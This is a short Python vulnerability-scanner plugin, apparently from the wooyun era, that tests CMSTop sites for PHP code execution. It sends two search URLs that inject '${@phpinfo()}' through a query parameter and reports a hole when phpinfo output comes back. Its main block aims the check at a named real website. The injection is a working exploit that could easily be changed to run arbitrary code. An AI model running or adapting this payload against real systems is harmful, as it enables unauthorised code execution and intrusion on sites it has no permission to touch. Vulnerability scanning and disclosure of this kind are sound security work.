#!/usr/bin/env python
#*_* coding: utf-8 *_*

#name: cmstop 代码执行
#author: yichin
#refer: http://www.wooyun.org/bugs/wooyun-2014-054693

def assign(service, arg):
    if service == "cmstop":
        return True, arg

def audit(arg):
    #搜索链接有两处，一是domain.com/app/?...二是app.domain.com/?...
    payloads = [
        'http://app.' + util.get_domain_root(arg) + '/?app=search&controller=index&id=$page&action=search&wd=a&test=${@phpinfo()}',
        arg + 'app/?app=search&controller=index&id=$page&action=search&wd=a&test=${@phpinfo()}'
    ]
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(payload)
        if code == 200 and 'PHP Version' in res and 'Configure Command' in res:
            security_hole(payload + ': cmstop code exectuion')
            break
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('cmstop', 'http://www.jsdushi.net/')[1])